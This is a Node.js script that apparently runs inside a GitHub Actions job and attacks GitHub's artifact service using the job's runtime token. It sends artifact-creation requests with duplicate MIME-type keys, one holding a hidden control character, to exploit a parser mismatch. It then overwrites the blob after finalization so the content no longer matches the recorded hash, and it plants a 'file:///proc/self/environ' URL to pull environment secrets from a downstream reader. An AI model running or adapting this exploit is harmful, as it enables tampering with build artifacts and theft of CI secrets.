const https = require('node:https');
const {createHash} = require('node:crypto');
const {appendFile} = require('node:fs/promises');

const repository = process.env.GITHUB_REPOSITORY;
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
if (!runtimeToken || !process.env.ACTIONS_RESULTS_URL) throw new Error('runtime-unavailable');

const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
const scope = String(claims.scp || '').split(' ').find(value => value.startsWith('Actions.Results:'));
const scopeFields = scope.split(':');
const service = 'github.actions.results.api.v1.ArtifactService';
const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;

function request(url, method, headers, body) {
  return new Promise((resolve, reject) => {
    const target = new URL(url);
    const req = https.request({
      method,
      hostname: target.hostname,
      port: target.port || 443,
      path: target.pathname + target.search,
      headers,
    }, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(30000, () => req.destroy(new Error('timeout')));
    if (body) req.write(body);
    req.end();
  });
}

async function rpcRaw(method, rawBody) {
  const response = await fetch(new URL('/twirp/' + service + '/' + method, origin), {
    method: 'POST',
    headers: {
      authorization: 'Bearer ' + runtimeToken,
      'content-type': 'application/json',
    },
    body: rawBody,
  });
  if (!response.ok) throw new Error('rpc-' + method + '-' + response.status);
  return response.json();
}

async function rpc(method, value) {
  return rpcRaw(method, JSON.stringify(value));
}

async function putBlob(url, bytes) {
  return request(url, 'PUT', {
    'content-type': 'application/octet-stream',
    'content-length': String(bytes.length),
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-blob-content-type': 'application/json',
    'x-ms-version': '2022-11-02',
  }, bytes);
}

async function main() {
  const runId = process.env.GITHUB_RUN_ID;
  const name = 'duplicate-mime-v7-' + runId;
  const common = [
    '"workflow_run_backend_id":' + JSON.stringify(scopeFields[1]),
    '"workflow_job_run_backend_id":' + JSON.stringify(scopeFields[2]),
    '"name":' + JSON.stringify(name),
    '"version":7',
    '"mime_type":"application/json"',
    '"mime_type":' + JSON.stringify('application/json\u0085'),
  ];
  const created = await rpcRaw('CreateArtifact', '{' + common.join(',') + '}');
  const uploadUrl = created.signed_upload_url || created.signedUploadUrl;
  if (!created.ok || !uploadUrl) throw new Error('create-rejected');

  const payload = {
    full_name: 'placeholder/repository',
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette duplicate MIME parser discriminator',
    stargazers_count: 0,
  };
  const initial = Buffer.from(JSON.stringify(payload));
  const uploaded = await putBlob(uploadUrl, initial);
  if (uploaded.status < 200 || uploaded.status >= 300) throw new Error('upload-' + uploaded.status);

  const digest = createHash('sha256').update(initial).digest('hex');
  const finalized = await rpc('FinalizeArtifact', {
    workflow_run_backend_id: scopeFields[1],
    workflow_job_run_backend_id: scopeFields[2],
    name,
    size: String(initial.length),
    hash: 'sha256:' + digest,
  });
  const id = finalized.artifact_id || finalized.artifactId;
  if (!finalized.ok || !id) throw new Error('finalize-rejected');

  payload.full_name = repository + '/actions/artifacts/' + id + '/zip';
  const finalBody = Buffer.from(JSON.stringify(payload));
  const overwritten = await putBlob(uploadUrl, finalBody);
  if (overwritten.status < 200 || overwritten.status >= 300) throw new Error('overwrite-' + overwritten.status);

  await appendFile(process.env.GITHUB_OUTPUT, 'artifact_ids=' + JSON.stringify([id]) + '\n');
  console.log('DUPLICATE-MIME-UPLOAD ' + JSON.stringify({
    artifactId: id,
    bytes: finalBody.length,
    bodySha256: createHash('sha256').update(finalBody).digest('hex'),
    duplicateMimeKeys: 2,
  }));
}

main().catch(error => {
  console.error(JSON.stringify({name: error.name, code: error.message.split('-').slice(-1)[0].slice(0, 32)}));
  process.exitCode = 1;
});
